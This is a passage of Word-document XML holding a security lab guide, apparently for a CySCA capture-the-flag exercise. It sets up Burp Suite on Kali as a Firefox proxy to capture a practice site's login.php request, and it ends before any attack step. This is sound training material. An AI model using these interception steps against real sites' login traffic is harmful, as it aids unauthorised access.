          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">On Kali </w:t>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Start up </w:t>
      </w:r>
      <w:r w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Burp</w:t>
      </w:r>
      <w:r w:rsidR="005A1606" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Suite</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> – this is a proxy server which intercepts web traffic, and allows you to edit the http stream. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BB57CA" w14:textId="77777777" w:rsidR="0062080C" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Click on Kali</w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Menu</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Search Burp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5323D44C" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>JRE msg appear, just OK. Then an Update required, skip this and continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20944160" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Select Temporary Project – Next</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729CCA93" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="2433A542">
          <v:shape id="_x0000_i1027" type="#_x0000_t75" style="width:279.25pt;height:189.35pt;visibility:visible">
            <v:imagedata r:id="rId11" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="04146D48" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Burp Defaults</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>, then start Burp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB10AA5" w14:textId="77777777" w:rsidR="00F86594" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Click on Proxy Tab, the on 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> level, Intercept – ensure Interception is On. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F22B38" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F3A43" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Then click HTTP history</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D70BD90" w14:textId="77777777" w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F" w:rsidRDefault="002A4922" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">On Kali Firefox browser - </w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Change the network settings in </w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Burp</w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>uite</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the proxy server. Refer to the following steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79251C52" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00D16E0A" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Edit &gt; Preferences </w:t>
      </w:r>
      <w:r w:rsidR="00607806" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBC5BEB" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00607806" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Scroll Down until &gt; Network Settings</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; Settings &gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181F1007" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00607806" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Choose </w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Manual Proxy Configuration.</w:t>
      </w:r>
      <w:r w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB6A538" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="00D16E0A" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001C35C4">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="6C578E98">
          <v:shape id="_x0000_i1028" type="#_x0000_t75" style="width:415.75pt;height:223.9pt;visibility:visible">
            <v:imagedata r:id="rId12" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BED5CE3" w14:textId="77777777" w:rsidR="00F86594" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F86594" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>We are going to use our Local Burpsuite as proxy</w:t>
      </w:r>
      <w:r w:rsidR="00E62FFF" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> on Kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> while monitoring the Firefox browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1160EE" w14:textId="77777777" w:rsidR="00D16E0A" w:rsidRPr="00FA4E5F" w:rsidRDefault="00D16E0A" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Type</w:t>
      </w:r>
      <w:r w:rsidR="00083F78" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00083F78" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 127.0.0.1, port 80</w:t>
      </w:r>
      <w:r w:rsidR="005023F8" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>into the HTTP Proxy field.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C07CF3" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="005023F8" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Back in </w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox, tab of CySCA page earlier</w:t>
      </w:r>
      <w:r w:rsidR="00E62FFF" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (The Welcome to Fortress page). Click around. </w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">click on all of the links including the Log In link. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Observe that Blog can’t be clicked since you have not login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0086651A" w14:textId="77777777" w:rsidR="00F22704" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F22704" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Burp </w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Suite – Proxy – Options</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>. Set the Intercept Client Requests as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE13C6F" w14:textId="77777777" w:rsidR="00F22704" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="76065134">
          <v:shape id="_x0000_i1029" type="#_x0000_t75" style="width:414.95pt;height:226.4pt;visibility:visible">
            <v:imagedata r:id="rId13" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D84BAF" w14:textId="77777777" w:rsidR="00A8061B" w:rsidRPr="0047777F" w:rsidRDefault="00A8061B" w:rsidP="00A8061B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="644"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0047777F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Refresh Firefox before you continue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DC6A51" w14:textId="77777777" w:rsidR="005F3A43" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E62FFF" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>On Kali Firefox browser, j</w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>ust try to login with any user and password</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (simply enter)</w:t>
      </w:r>
      <w:r w:rsidR="005F3A43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE774ED" w14:textId="77777777" w:rsidR="005023F8" w:rsidRPr="00FA4E5F" w:rsidRDefault="005023F8" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Back in Burpsuite, select the History tab. You will see </w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>a list of HTTP requests</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>. Click on</w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> the login.php line. </w:t>
      </w:r>
